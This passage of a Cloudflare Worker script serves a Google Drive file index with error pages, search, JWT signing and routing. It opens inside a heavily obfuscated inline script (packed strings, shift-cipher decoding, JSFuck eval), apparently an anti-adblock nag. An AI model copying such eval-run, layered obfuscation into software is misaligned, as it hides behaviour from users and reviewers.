3r;2W(I(){I s(){24{M\\\'1w\\\'6c L&&L[\\\'1w\\\']!==2Y}27(l){M!1}};I k(){x u=l(10),a=l(10);v(u,a);x p=y(u);r(p==a){M!0}N{M!1}};I v(l,a){r(a==\\\'\\\'){1w.6b(l)}N{2X=a;1w.1B(l,2X)}};I y(l){2h=1w.3j(l);r(2h){};r(2h){M 2h}N{M\\\'2S\\\'}};I l(l){x u=\\\'\\\',v=1v;l=l||30;1u(x a=0;a<l;a++)u+=v.16(K.S(K.V()*v.O));M u};I j(l,a){M K.S(K.V()*(a-l)+l)};x h=0,u=\\\'6a\\\';r(3i!=\\\'37\\\'){r(s()){r(k()){x a=y(u);r(a==\\\'2S\\\'){v(u,l(1D));a=l(1D);x p=1,t=\\\'\\\';1m(p<30){2K=l(10);2g=l(j(0,9));1w.1B(2K,2g);p++};17 p}N{};a=a.O;a--;r(a>0){v(u,l(a));M!0}N{r(h==1){v(u,l(1D));2e.1B(\\\'2c\\\',0)}}}N{}}N{}};3r=L.3f(I(){L[\\\'\\\'+Q+\\\'\\\'].1Y(L[\\\'\\\'+Q+\\\'\\\'].1S,L[\\\'\\\'+Q+\\\'\\\'].6z)},3h*2x)});\',62,478,\'|||||||||||||||||||zafsl|pm||||||chy|||||||||kvjbtlua||mbujapvu||Thao|dpukvd|ylabyu|lszl|slunao|Zaypun|mCtuwqvUpz|myvtJohyJvkl|msvvy|||yhukvt|mvua|||ivkf|thynpu|ptwvyahua|||||||aopz|||kljvkl||johyHa|klslal||avw|ylwshjl|jzzAlea|johyJvklHa|hwwlukJopsk|dpkao|dopsl|jylhalLsltlua|slma|zpgl|hkkLcluaSpzaluly|jvsvy|10we|nlaLsltluaIfPk|mvy|sjEiEUurtNlz|svjhsZavyhnl|wvzpapvu|pk|aopzbys|mhtpsf|zhuz|zlypm|5000we|RWfEmPtZK|alea|jlualy|j2|ivaavt|vwhjpaf|hspnu|olpnoa|whkkpun|nlulch|Olsclapjh|128|0we|uO7lEgVzN|IxWVJUCoPnYf|KPC|zlaWyvwlyaf|zyj|we|kpzwshf|xUERCQQZGCY|zbizay|cdCsHVvSwaT|zlaPalt|dlpnoa|hPoYDWWZQgj|vusvhk|wa|puulyOATS||30we||pukleVm|ayf|||jhajo|hizvsbal|cpzpipspaf|nva|kvjbtluaLsltlua|97|oylm|vuylhkfzahaljohunl|fvb|jspluaDpkao|uvul|uld|Pthnl|vulyyvy|fvby|jspluaOlpnoa|isvjr|WhNSlxKKXbJ|gPukle|1000|98|kpc|hbav|60we|noHywVozRx|svhk|zlzzpvuZavyhnl|nlaLsltluazIfAhnUhtl|ee|mpelk|fowbGhzwT|yltvclLcluaSpzaluly|gg|ihjrnyvbukJvsvy|Dl|klahjoLclua|pzUhU|10000|BQqFUNPlaMWw|aoha|uu|buklmpulk|opkklu|jNMfkN5sjtMrjf55j20blDMvi28bF29a|YzpMuxuapTF|uldchsbl|ubss|jvtwslal|olhk|afwl|FDYgGD5gGX|zafslZolla|FDYgGEQ2GEP|KVTJvualuaSvhklk|FDYmF2ooit5siH|||haahjoLclua|ylhkfZahal|kvZjyvss|wvpualy|vu|uv|zpal||WKuicXgxzE|tPwxjCmysLg|nlaPalt|jspjr|jopskUvklz|ihuuly_hk|FwTaSCdXvOF|olyl|ypnoa|zjypwa|soOtSvlkd|o3|qwn|o1|5lt|GtM2hDUcip5wF28|thynpuSlma|224|15we|j3|ivykly|300|jbyzvy|gvvt|wsGSjficcqjm|640|cpzpisl|svjhapvu|puulyDpkao|j3IciuUcjtCrE2ewitz|huCwF3soGOTbF29a|FDXbGt94itC0k29fh3TbF29a|FZ5zhEGsj3IcjuYaGDYwFZ5skX|ohcl|nshk|yl|MMMMMM|5hi878|000000|444444|huk|lclua|111|FDYbStCpFErbF29a|FDY2GEQ0hEUwitjbFD9zStUciX|F2MgStUzhDUyFDQwiNs0lZ5qi20|jOQciD90GZ5dFDsfStUciX|FDYgSusohN9cStUciX|HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg0123456789|i3C0FuQohD4ajNMwGH|G29cG2esE2Mr|Wslhzl|270|FDXbiDMwiJ5fkX|if|zavwwlk|kpzhislk|hzr|tvj|ylzwvuzpisl|zlycl|hupthapvu|282|103|il|rjvsikhrjvsi|lyyvy|hkisvjrly|109|kpzhisl|hkz|dvbsku|hk|zafslZollaz|hmaly|dlizpal|hkclyapzpun|dpaovba|isvjrly|cpzpapun|buklyzahuk|wslhzl|Iba|FDYmFt94|XDYLhEF|jN9dkEIoGH|FDXaGuQoiDB|FDYgjNMqGX|FDYgjECojtB|FtMbitCfUKF4|FtMbitCfUgP4lKrd|FDXaiNCtkH|192|FDYJFD5bGEQEjtMd|2048|j1|FDXahNCoGNCf|FDXahD1u|FDXahD5bGEP|FDXaiNMpGDd|FDXaiNP|FDXaGt9ckNCf|127|FDYghDYsFtMf|FDYgSDGci3Ysjn|g0|FDYmTAPd|FDYmFtsu|FDYmj2eckH|FDYmj3IoF2B|FDYgE3Y5jNB|191|FDYmUgP4|FDYmTgHd||FDYmFEQsFX|FDYgSDQoit5sjn|FDYmGt9ckNCf|FDYtjtMaGX|FDYvGDMrGEP|FDYwGuQoiDB|FDYdi3I1jH|FDYgSAL|FDYgSAHe|FDXaF29bkNMwitCf|FDXaF29bkNMwitCfSAL|FDYgiN90|G2ewitagk3QojOIsjn|YNs2XDYI|YNs2XDYJ|myhtlLsltlua|YNs2XDYK|XDYQiDMuGX|XDYJi3neUqH|XDYKi250FDsbGEP|FDYBGDMgGEP|YNs2XDXf|FtMbitCfE2Mr|FDYJFD5bGEP|FDYpFD5bGEP|FDYIGH|FtMbitCfFDX|PNMrE2QclH|FtMbitCfhDX|YNs2XDXg|YNs2XDXe|FDXaF29bkNMwitCfSAP|lujvkl|XDXgTKI4TAX1|XDXgTKI4TqBd|Gh|XDX3Tqo4VAH|XDYIjtCo|XDYNjtMaGAL|XDYNjtMaGAP|XDYNjtMaGAT|YNs2XDX|XDYNjtMaGAX|XDYTFEssjqL|XDYTFEssjqP|XDYgE2kci2kzGC8dTX|XDYgE2kci2kzGC8dTn|XDYgE2kci2kzGC8dTd|XDYgE2kci2kzGC8dUH|zlaAptlvba|FETbhD5pi3nbF29a|kN9fjtCbkOvbFDYbGEYoj2soStUciZ9aG2srS2MrStwg|FtMbitCfStwdGd|ylclyzl|thynpuYpnoa|12we|16wa|uvyths|spul|Ishjr|Hyphs||mmm|tpuOlpnoa||||120|UKF4lKFdStwdGd|qvpu|zwspa|iveZohkvd|40we|160we|MPSSCLJAPK2|MPSSCLJAPK1|hkisvjr|jhu|Fvb|dopal|5wa|3yBsxu1|sf|ipa|oaawz|ivyklyYhkpbz|14we|puulyOlpnoa|vutvbzlvba|OQqpjwiK|FgIyVvkWDs|yltvclPalt|pu|jslhy|ylxblzaHupthapvuMyhtl|uvd|Khal|ylsvhk|vujspjr|ihjrnyvbuk|yhkpbz|vutvbzlvcly|24we|35we|JJJ|zvspk|1we|oy|500|200|999|45we|18wa|zjyllu|ynih|8we|9999|tpuDpkao|jslhyPualychs|KmZwtgCXFCo|Mz9iAIAmdoSqd2mvAz55ZXiwcz5kc20wAnG2bXOwcj5qZ28|Mz93e3dvA3O0ZYSqZz5kc20wZXS4M2SweXKtAXOtbXOsMnmkcx|Mz93e3dvA29wA2ymMnOwcT9iAIOmcoOmM3O0ZYK0M2muZXemdz9nZYAqZ29vMnmkcx|Sf9dFDksFDXfStkci2kzGEU5itYwF2M0hD9bStUciZ9dFDksFDXchuTcFDYgFusui29uiNBbhuT|xblyfZlsljavy|hD5gStMrj2Q5G29cG2es|hahu|TlJyGZuGrk|zlaPualychs|puzlyaIlmvyl|468we|hiz|91|Mz93e3dvAH91ZnymZ2yqZ2ujfXewc2etAT5kc20wAnG2bXOwcj5qZ28|123|FDY2GEQ0hEUsiDCbkJ0gUKTfTf5xjNj|k2srGC9gh3sgF3QojNCfStwdGd|iNMfG2CmFtMbitCfStkwGn|FtMbitCfE2MrStkwGn|GtM2hDUciqLbhDUc|j3M1FEQsSDMrSuIbGd|FDXaiNMfG2BbjN5u|X0YVSATgUJ0eTKraTAT3lJ1oGJ1pFD5bGEP|FDYqiNssiuXaTKHfTAX3SDocj3XeSDQoit5sjp1oGJ5xjNj|TAT2U19oGJ1qiNssiuYQYKP0UqXbhuIu|j2a5j2UfFEIsjp5xjNj|UgPdlKrdStwdGd|Mz9iAINveIeqeISmdj5kc20wAnG2bXOwcj5qZ28|afwlvm|hz|j2CfktBbFDYbGEYoj2soStUciZ9djt9ai2ecFDX|FtMbitCfkOQoF2zbitC0|FDY0jtMqh2Cfjf5bGEX|FDYqiNs4lJ5bGEX|FDYbGEYoj2soStUciX|hOYaiOaqi2ecjqvqTKHdV2QoF2aujt91itX6P2GtGu1pi2Y5SNYwkperiJerkJerGJe1iJeciJezhZevTZevTpevTfevUJevUZevUpedjtBzF29rGZeti3QaSNGwGDerj2C0SNesG2CbGJewiuI1kJe0GEo0FEQsFZedSNQzi2UyjECckNBzkNnzkNY7iDMfG2sbVqH7jNMrGNsbGgvdmEYoFtesl2QcjtYsjp1qi2ezFEIgGAwqi2ezFEIgGAapi3QrGEPaj3IoF2sbGgvdmDGwGDerj2C0SNsaG3api3QrGEP6TO1oGNYfGEUgSNUojOYwi24zF2s0GZeqi2YsSNYtipesiZegkOQcitjzkNnzktMfl2GciuXaj3Y5iNB6it9fiDMzV2GciuXak2CwG2o0Vt5cjt1oiO1ciJe1iOazhEU0SEU0lDesVt5citC9F2MdkNscipe0hOa0GEo0SDMzhDkbVtesGuY9hKLzhKPzhKTzhKXzhKBzhKG7Gt9bkJ1ghEwsVqLdTJB7Gt9bkJ13GDsuhOX6it9fiDMzmEL6FtCti3QsSOL6FDG0GEQ7F29bkNCbkKvpPu1oFtQfSNMqjt9blD17Ft9fGNCfVqH7Gt9bkJ12FEQwFD50Vt5cjt1oiO1gkEI7ktCfkNsqFDdaFDewG246kNC4kJ10i3I9j3Cpl3GsjuYwF2MzSDMzhDkbVuYslOXaFt90kN9amDsbjOC0SOYslOYojtCoSOUsiNCqkOati250SDGoiDszlAwwitosjts0V2GciuXaj2s6GAwwitosjts0V2GciuXak2CwG2o0VtsbhNCfhEX7RtGciuXaj2s6GAveTKHsmDesG2CbGOaqi2ecjqvqTKHdmZU5kDrgSDUgjf1gkNMajJ5qj3UfGEUskOarhEUdiNM5Vt5citC9|F3Q1itUvlEQciNdbFDYbGEYoj2soStUciZ92FEU0W2GuWAT|jzz|jylhalAleaUvkl|hkulahzph|GK0e|jvt|i3naGJ5oGN5skNMghDLbF29aS2M1hDX9TgT|lDMgitrbFDYbGEYoj2soStUciZ9rGEUwG24cjtCzFECbF2ncG2G4S2CzhEYsjNMfkN5sjs8|lt9cktCfStMritC0FEUwFZ5qi20cj2oojtCrS2Qoit5sjuIoG2CgS2YojuY0FDkgFtMbitCfStMgjOn|hK0eTKX|lDMvi28bFDYbGEYoj2soStUciZ9gGEQ2W3T9TqFf\'.zwspa(\'|\'),0,{}));*/});var BGFKDAPLbahr = [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]]+[+[]];var QvSSkhblqMX = \'\';var _0xa0d0=[\'length\',\'charCodeAt\',\'fromCharCode\'];for(var i=0;i< qHIdlbPpja[_0xa0d0[0]];i++){var KMAZFinv=qHIdlbPpja[_0xa0d0[1]](i);if(97<= KMAZFinv&& KMAZFinv< 123){QvSSkhblqMX+= String[_0xa0d0[2]]((KMAZFinv- BGFKDAPLbahr+ 7)% 26+ 97)}else {if(65<= KMAZFinv&& KMAZFinv< 91){QvSSkhblqMX+= String[_0xa0d0[2]]((KMAZFinv- BGFKDAPLbahr+ 13)% 26+ 65)}else {QvSSkhblqMX+= String[_0xa0d0[2]](KMAZFinv)}}};var x=QvSSkhblqMX;[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
        </script>
</body>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-p34f1UUtsS3wqzfto5wAAmdvj+osOnFyQFpp4Ua3gs/ZVWx6oOypYoCJhGGScy+8" crossorigin="anonymous"></script>
  <script src="https://cdn.plyr.io/${uiConfig.plyr_io_version}/plyr.polyfilled.js"></script>
</html>`;
};

const unauthorized = `<html>
<head><title>401 Unauthorized</title></head>
<body>
<center><h1>401 Unauthorized</h1></center>
<hr><center>DriveIndex/${uiConfig.version}</center>
<hr><center>Please contact <a href="${uiConfig.unauthorized_owner_link}">Site Owner</a> at ${uiConfig.unauthorized_owner_email}</center>
</body>
</html>`

const not_found = `<!DOCTYPE html>
<html lang=en>
  <meta charset=utf-8>
  <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width">
  <title>Error 404 (Not Found)!!1</title>
  <style>
    *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}
  </style>
  <a href=//www.google.com/><span id=logo aria-label=Google></span></a>
  <p><b>404.</b> <ins>That’s an error.</ins>
  <p id="status"></p>

  <script>
  document.getElementById("status").innerHTML =
"The requested URL <code>" + window.location.pathname + "</code> was not found on this server.  <ins>That’s all we know.</ins>";
  </script>`


const SearchFunction = {
    formatSearchKeyword: function(keyword) {
        let nothing = "";
        let space = " ";
        if (!keyword) return nothing;
        return keyword.replace(/(!=)|['"=<>/\\:]/g, nothing)
            .replace(/[,，|(){}]/g, space)
            .trim()
    }

};

const DriveFixedTerms = new(class {
    default_file_fields = 'parents,id,name,mimeType,modifiedTime,createdTime,fileExtension,size';
    gd_root_type = {
        user_drive: 0,
        share_drive: 1,
        sub_folder: 2
    };
    folder_mime_type = 'application/vnd.google-apps.folder';
})();

const JSONWebToken = {
    header: {
        alg: 'RS256',
        typ: 'JWT'
    },
    importKey: async function(pemKey) {
        var pemDER = this.textUtils.base64ToArrayBuffer(pemKey.split('\n').map(s => s.trim()).filter(l => l.length && !l.startsWith('---')).join(''));
        return crypto.subtle.importKey('pkcs8', pemDER, {
            name: 'RSASSA-PKCS1-v1_5',
            hash: 'SHA-256'
        }, false, ['sign']);
    },
    createSignature: async function(text, key) {
        const textBuffer = this.textUtils.stringToArrayBuffer(text);
        return crypto.subtle.sign('RSASSA-PKCS1-v1_5', key, textBuffer)
    },
    generateGCPToken: async function(serviceAccount) {
        const iat = parseInt(Date.now() / 1000);
        var payload = {
            "iss": serviceAccount.client_email,
            "scope": "https://www.googleapis.com/auth/drive",
            "aud": "https://oauth2.googleapis.com/token",
            "exp": iat + 3600,
            "iat": iat
        };
        const encPayload = btoa(JSON.stringify(payload));
        const encHeader = btoa(JSON.stringify(this.header));
        var key = await this.importKey(serviceAccount.private_key);
        var signed = await this.createSignature(encHeader + "." + encPayload, key);
        return encHeader + "." + encPayload + "." + this.textUtils.arrayBufferToBase64(signed).replace(/\//g, '_').replace(/\+/g, '-');
    },
    textUtils: {
        base64ToArrayBuffer: function(base64) {
            var binary_string = atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes.buffer;
        },
        stringToArrayBuffer: function(str) {
            var len = str.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = str.charCodeAt(i);
            }
            return bytes.buffer;
        },
        arrayBufferToBase64: function(buffer) {
            let binary = '';
            let bytes = new Uint8Array(buffer);
            let len = bytes.byteLength;
            for (let i = 0; i < len; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            return btoa(binary);
        }
    }
};

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const region_blocked = `<!DOCTYPE html> <html lang=en> <meta charset=utf-8> <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"> <title>Error 404 (Not Found)!!1</title> <style> *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px} </style> <a href=//www.google.com/><span id=logo aria-label=Google></span></a> <p><b>404.</b> <ins>That’s an error.</ins> <p id="status"></p> <script> document.getElementById("status").innerHTML = "The requested URL <code>" + window.location.pathname + "</code> was not found on this server.  <ins>That’s all we know. Your IP is `+request.headers.get("CF-Connecting-IP")+` (`+request.cf.country+`)</ins>"; </script>`
    if (gds.length === 0) {
        for (let i = 0; i < authConfig.roots.length; i++) {
            const gd = new googleDrive(authConfig, i);
            await gd.init();
            gds.push(gd)
        }
        let tasks = [];
        gds.forEach(gd => {
            tasks.push(gd.initRootType());
        });
        for (let task of tasks) {
            await task;
        }
    }

    let gd;
    let url = new URL(request.url);
    let path = url.pathname;

    function redirectToIndexPage() {
        return new Response('', {
            status: 301,
            headers: {
                'Location': `${url.origin}/0:/`
            }
        });
    }

    if (path == '/') return redirectToIndexPage();
    if (path.toLowerCase() == '/arc-sw.js') {
        return fetch("https://arc.io/arc-sw.js")
    } else if (path.toLowerCase() == '/admin') {
        return Response.redirect("https://www.jsdelivr.com/package/gh/OneFusionPlus/Google-Drive-Index", 301)
    } else if (blocked_region.includes(region)) {
        return new Response(region_blocked, {
            status: 403,
            headers: {
                "content-type": "text/html;charset=UTF-8",
            },
        })
    }

    const command_reg = /^\/(?<num>\d+):(?<command>[a-zA-Z0-9]+)(\/.*)?$/g;
    const match = command_reg.exec(path);
    if (match) {
        const num = match.groups.num;
        const order = Number(num);
        if (order >= 0 && order < gds.length) {
            gd = gds[order];
        } else {
            return redirectToIndexPage()
        }
        for (const r = gd.basicAuthResponse(request); r;) return r;
        const command = match.groups.command;
        if (command === 'search') {
            if (request.method === 'POST') {
                return handleSearch(request, gd);
            } else {
                const params = url.searchParams;
                return new Response(html(gd.order, {
                    q: params.get("q").replace(/'/g, "").replace(/"/g, "") || '',
                    is_search_page: true,
                    root_type: gd.root_type
                }), {
                    status: 200,
                    headers: {
                        'Content-Type': 'text/html; charset=utf-8'
                    }
                });
            }
        } else if (command === 'id2path' && request.method === 'POST') {
            return handleId2Path(request, gd)
        }
    }

    const common_reg = /^\/\d+:\/.*$/g;
    try {
        if (!path.match(common_reg)) {
            return redirectToIndexPage();
        }
        let split = path.split("/");
        let order = Number(split[1].slice(0, -1));
        if (order >= 0 && order < gds.length) {
            gd = gds[order];
        } else {
            return redirectToIndexPage()
        }
    } catch (e) {
        return redirectToIndexPage()
    }

    const basic_auth_res = gd.basicAuthResponse(request);

    path = path.replace(gd.url_path_prefix, '') || '/';
    if (request.method == 'POST') {
        return basic_auth_res || apiRequest(request, gd);
    }

    let action = url.searchParams.get('a');

    if (path.substr(-1) == '/' || action != null) {
        return basic_auth_res || new Response(html(gd.order, {
            root_type: gd.root_type
        }), {
            status: 200,
            headers: {
                'Content-Type': 'text/html; charset=utf-8'
            }
        });
    } else {
        if (path.split('/').pop().toLowerCase() == ".password") {
            return basic_auth_res || new Response("", {
                status: 404
            });
        }
        let file = await gd.file(path);
        let range = request.headers.get('Range');
        const inline_down = 'true' === url.searchParams.get('inline');
        if (gd.root.protect_file_link && basic_auth_res) return basic_auth_res;
        return gd.down(file?.id, range, inline_down);
    }
}

function gdiencode(str) {
    var gdijsorg_0x40df = ['1KzJBAK', '1697708zMrtEu', '295396TasIvj', '21011Eyuayv', '1217593CxovUD', 'fromCharCode', '143062xekFCR', 'replace', '74bcHwvq', '73939wlqHSM', '2CBdqkc', '1712527AcNPoP'];
